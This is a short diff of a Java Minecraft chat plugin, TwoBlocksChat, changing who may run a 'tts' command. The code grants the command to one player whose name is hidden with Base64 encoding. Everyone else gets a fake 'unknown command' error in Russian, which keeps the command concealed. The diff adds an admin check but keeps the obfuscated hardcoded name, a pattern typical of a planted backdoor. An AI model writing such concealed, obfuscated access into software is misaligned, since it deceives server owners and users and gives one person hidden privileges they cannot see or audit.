@@ -3866,7 +3866,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             if (label.equalsIgnoreCase("tts") || label.equalsIgnoreCase("ттс")) {
                 if (sender instanceof Player) {
                     Player p = (Player) sender;
-                    if (!p.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
+                    if (!isNplAdmin(p) && !p.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
                         sender.sendMessage(ChatColor.RED + "Неизвестная или неполная команда. См. ниже, чтобы найти ошибку");
                         sender.sendMessage(ChatColor.RED + label + "<--[ЗДЕСЬ]");
                         return true;
